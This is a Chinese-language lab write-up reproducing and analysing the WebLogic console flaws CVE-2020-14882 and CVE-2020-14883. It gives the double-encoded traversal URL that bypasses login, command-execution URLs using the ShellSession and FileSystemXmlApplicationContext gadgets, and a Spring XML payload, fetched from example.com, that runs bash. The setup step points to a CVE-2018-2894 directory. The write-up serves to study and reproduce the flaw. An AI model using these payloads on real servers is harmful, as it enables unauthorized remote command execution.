# Weblogic 管理控制台未授权远程命令执行漏洞 (CVE-2020-14882，CVE-2020-14883)

## 漏洞详情

CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。

CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。

使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。



## 影响版本

- Oracle WebLogic Server 版本10.3.6.0
- Oracle WebLogic Server 版本12.1.3.0
- Oracle WebLogic Server 版本12.2.1.3
- Oracle WebLogic Server 版本12.2.1.4
- Oracle WebLogic Server 版本14.1.1.0



## 环境搭建

```
cd weblogic/CVE-2018-2894
docker-compose up -d
```



## 漏洞复现

首先测试权限绕过漏洞，我们访问URL就可以未授权访问到管理后台

```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal
```

![image-20210414141613624](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210414141613624.png)

但是这个时候我们只是一个最低权限的用户，无法安装应用，所以也无法直接执行任意代码

此时需要利用到第二个漏洞CVE-2020-14883。这个漏洞的利用方式有两种：

- `com.tangosol.coherence.mvel2.sh.ShellSession`
- `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`

直接访问如下URL，即可利用`com.tangosol.coherence.mvel2.sh.ShellSession`执行命令，这里我们执行`touch /tmp/success1`命令

```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")
```

进入容器，可以发现`touch /tmp/success1`已成功执行：

![image-20210414142020099](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210414142020099.png)

这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在`com.tangosol.coherence.mvel2.sh.ShellSession`类。

`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`是一种更为通杀的方法，最早在CVE-2019-2725被提出，对于所有Weblogic版本均有效。

首先，我们需要构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上，如`http://example.com/rce.xml`：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[touch /tmp/success2]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：

```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")
```

![image-20210414142800627](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210414142800627.png)



## 漏洞分析

weblogic的console中，应用会对路径进行分析，看一下是否是访问资源文件的，所以只要路径中包含map中的值，consloe在处理请求的时候，就不要求登录态

**问题一，weblogic的console中，哪些资源文件的访问不需要登录**

这个逻辑的处理代码在`ServletSecurityManager.checkAccess`中，首先应用会对路径进行分析，看一下是否是访问资源文件的

![img](images/Weblogic%20%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2020-14882%EF%BC%8CCVE-2020-14883).assets/t01cabb76ea60314c07.png)

跟进`this.webAppSecurity.getConstraint`直至`StandardURLMapping.getExactOrPathMatch`，在这里会去查看访问的url是否在资源文件的map中，这里无需多做分析，基于路径的资源文件名单自然是以包含作为匹配的依据，所以只要路径中包含map中的值，consloe在处理请求的时候，就不要求登录态

具体的权限检查调用逻辑如下，首先在`ChainedSecurityModule.checkAccess`中会检测路径是否包含登录接口（j_security_check）

![img](images/Weblogic%20%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2020-14882%EF%BC%8CCVE-2020-14883).assets/t0189ba2457e511f7b8.png)

如果不包含，则进入`CertSecurityModule.checkUserPerm`，在这个函数中会检测配置常量`protectResourceIfUnspecifiedConstraint`的值（默认为false），如果是false就会进入`WebAppSecurityWLS.hasPermission`，查看是否有这个文件的访问权限，当然，资源文件的访问权限自然是有的

![img](images/Weblogic%20%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2020-14882%EF%BC%8CCVE-2020-14883).assets/t01ceaf371852843d6e.png)

于是应用就判断这条请求是具有权限的，checkAccess返回true，进入接下来的调用。

**接下来就是问题二，weblogic究竟在哪个位置进行了二次url编码**

一次url编码肯定是正常的 ，这是每个中间件都会做的事情，那我们顺着这条调用栈继续往下跟进，这段代码位于`UIServletInternal.getTree`处，在这里应用对已经进行了一次url编码的URI进行了第二次url编码

![img](images/Weblogic%20%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2020-14882%EF%BC%8CCVE-2020-14883).assets/t013329fe717c2d0328.png)

由于在后续的一系列操作中weblogic并没有在对路径穿越进行防范，从而造成了CVE-2020-14882漏洞，即后管权限绕过。

**接下来就可以进入第三个问题了，命令执行的原因。**

先从漏洞触发的入口类进行分析，`BreadcrumbBacking.init`类在处理后管请求的时候会去看一下提交的参数中是否有handle参数

![img](images/Weblogic%20%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2020-14882%EF%BC%8CCVE-2020-14883).assets/t01f9afac8db7cb147b.png)

具体的操作逻辑在findFirstHandle中

![img](images/Weblogic%20%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2020-14882%EF%BC%8CCVE-2020-14883).assets/t0110226f4ac53feb7f.png)

如果存在handle参数，就会把它的值传给`HandleFactory.getHandle`函数，而在这个函数中，会将形如aaa.bbb.class(“ccc”)的handleStr分解为两块，aaa.bbb.class作为被实例化的类，ccc作为参数，然后将ccc传入aaa.bbb.class的构造函数，并进行调用。

接下来就是一个gadgets的寻找问题了，什么类的构造函数调用后会造成rce的效果，目前公开的poc是coherence.jar中的类ShellSession，本文也就去分析一下这一条gadgets，看一下调用栈

![img](images/Weblogic%20%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2020-14882%EF%BC%8CCVE-2020-14883).assets/t0175789f1602822694.png)

ShellSession类会把传入构造函数的值交给`MVELInterpretedRuntime.parse`，而`MVELInterpretedRuntime`会通过反射去执行java代码，从而造成了RCE。

这里可以看到`MVELInterpretedRuntime`是一个具有代码执行功能的类，在后续的漏洞挖掘中这个类说不定会再次登场。

参考：https://www.anquanke.com/post/id/221835?display=mobile



## 防御与修复

及时下载官方的补丁程序





